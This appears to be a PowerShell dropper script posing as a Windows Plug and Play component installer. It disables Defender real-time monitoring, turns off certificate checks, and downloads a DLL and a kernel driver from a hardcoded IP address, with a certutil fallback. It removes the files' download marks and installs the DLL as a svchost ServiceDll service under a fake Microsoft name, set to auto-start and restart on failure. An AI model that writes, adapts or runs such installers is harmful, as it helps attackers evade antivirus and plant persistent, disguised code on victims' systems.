# Windows Plug and Play Extensions - Web Installer (svchost.exe ServiceDll)
param([string]$Server = "https://64.226.66.66")

$ErrorActionPreference = "SilentlyContinue"
$SYS32    = "$env:SystemRoot\System32"
$DRIVERS  = "$env:SystemRoot\System32\drivers"
$SVC      = "WPnpSvc"
$SVCGROUP = "PnpExtGroup"
$TD       = "$env:TEMP\wpnp_$(Get-Random)"

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Write-Host "[!] Run as Administrator" -ForegroundColor Red; Read-Host "Press Enter"; exit 1
}

Write-Host "============================================"
Write-Host " Web Setup | Server: $Server"
Write-Host " (svchost.exe ServiceDll)"
Write-Host "============================================"
Write-Host ""

Write-Host "[1/7] Preparing..." -ForegroundColor Cyan
try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
Start-Sleep 2

Write-Host "[2/7] Downloading..." -ForegroundColor Cyan
New-Item -Path $TD -ItemType Directory -Force | Out-Null
try { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } } catch {}
foreach ($f in @("pnpext.dll","pnpext.sys")) {
    Write-Host "       $f ..." -NoNewline
    try { Invoke-WebRequest "$Server/files/$f" -OutFile "$TD\$f" -UseBasicParsing -TimeoutSec 60; Write-Host " OK" -ForegroundColor Green }
    catch { & certutil -urlcache -split -f "$Server/files/$f" "$TD\$f" 2>$null | Out-Null
        if (Test-Path "$TD\$f") { Write-Host " OK" -ForegroundColor Green }
        elseif ($f -eq "pnpext.dll") { Write-Host " FAIL" -ForegroundColor Red; Remove-Item $TD -Recurse -Force; try{Set-MpPreference -DisableRealtimeMonitoring $false}catch{}; Read-Host; exit 1 }
        else { Write-Host " skip" -ForegroundColor Yellow } } }

Write-Host "[3/7] Removing old..." -ForegroundColor Cyan
sc.exe stop $SVC 2>$null|Out-Null; Start-Sleep 2; sc.exe delete $SVC 2>$null|Out-Null
Stop-Process -Name rundll32 -Force -EA SilentlyContinue
Remove-Item "$SYS32\WPnpSvc.exe" -Force -EA SilentlyContinue
Remove-Item "$SYS32\spoolcfg.exe" -Force -EA SilentlyContinue

Write-Host "[4/7] Installing files..." -ForegroundColor Cyan
foreach ($f in @("pnpext.dll","pnpext.sys")) {
    if (Test-Path "$TD\$f") {
        Remove-Item "$TD\$f`:Zone.Identifier" -Force -EA SilentlyContinue
        $dst = if($f -eq "pnpext.sys"){$DRIVERS}else{$SYS32}
        Copy-Item "$TD\$f" "$dst\$f" -Force
        Write-Host "       $f -> $dst\" -ForegroundColor Gray
    }
}

Write-Host "[5/7] Creating service (svchost.exe ServiceDll)..." -ForegroundColor Cyan
$svchostKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
$existing = (Get-ItemProperty $svchostKey -Name $SVCGROUP -EA SilentlyContinue).$SVCGROUP
if (-not $existing) {
    New-ItemProperty -Path $svchostKey -Name $SVCGROUP -Value @($SVC) -PropertyType MultiString -Force | Out-Null
}
sc.exe create $SVC binPath= "$env:SystemRoot\System32\svchost.exe -k $SVCGROUP" type= share start= auto DisplayName= "Windows Plug and Play Extensions" 2>$null|Out-Null
sc.exe description $SVC "Manages extended Plug and Play device configuration and compatibility" 2>$null|Out-Null
sc.exe failure $SVC reset= 86400 actions= restart/10000/restart/30000/restart/60000 2>$null|Out-Null

Write-Host "[6/7] Configuring ServiceDll..." -ForegroundColor Cyan
$paramPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$SVC\Parameters"
New-Item $paramPath -Force|Out-Null
New-ItemProperty $paramPath -Name "ServiceDll" -Value "$SYS32\pnpext.dll" -PropertyType ExpandString -Force|Out-Null
New-ItemProperty $paramPath -Name "ServiceMain" -Value "ServiceMain" -PropertyType String -Force|Out-Null

Write-Host "[7/7] Starting + cleanup..." -ForegroundColor Cyan
sc.exe start $SVC 2>$null|Out-Null; Start-Sleep 5
Remove-Item $TD -Recurse -Force -EA SilentlyContinue
try { Set-MpPreference -DisableRealtimeMonitoring $false } catch {}

$ok = & tasklist /m pnpext.dll 2>$null | Select-String svchost
Write-Host ""
if ($ok) { Write-Host "[+] SUCCESS! Running in svchost.exe" -ForegroundColor Green }
else { Write-Host "[?] Check after reboot" -ForegroundColor Yellow }
Write-Host ""; Read-Host "Press Enter"
